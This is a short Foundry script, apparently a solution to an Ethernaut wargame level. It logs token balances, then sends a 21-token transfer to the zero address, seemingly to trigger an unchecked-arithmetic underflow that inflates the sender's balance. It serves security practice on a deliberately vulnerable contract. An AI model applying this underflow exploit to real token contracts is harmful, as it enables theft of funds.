// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {EthernautL6} from "../src/EthernautL6.sol";

contract EthernautL6Script is Script {
    EthernautL6 public ethernautL6 = EthernautL6(0x772f2aFeF8f829000305357AdeC67D31f5cE579d);

    function run() public {
        uint256 userBalance = ethernautL6.balanceOf(0xA86Ea1be0A43Ea977dd7489c7c91247B1a7bC50b);
        console.log("User balance: ", userBalance);

        uint256 levelBalance = ethernautL6.balanceOf(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407);
        console.log("Level balance: ", levelBalance);

        uint256 instanceBalance = ethernautL6.balanceOf(0x772f2aFeF8f829000305357AdeC67D31f5cE579d);
        console.log("Instance balance: ", instanceBalance);  

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ethernautL6.transfer(address(0), 21);
        vm.stopBroadcast();

        uint256 userBalanceAfter = ethernautL6.balanceOf(0xA86Ea1be0A43Ea977dd7489c7c91247B1a7bC50b);
        console.log("User balance: ", userBalanceAfter);

        uint256 levelBalanceAfter = ethernautL6.balanceOf(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407);
        console.log("Level balance: ", levelBalanceAfter);

        uint256 instanceBalanceAfter = ethernautL6.balanceOf(0x772f2aFeF8f829000305357AdeC67D31f5cE579d);
        console.log("Instance balance: ", instanceBalanceAfter); 

    }
}
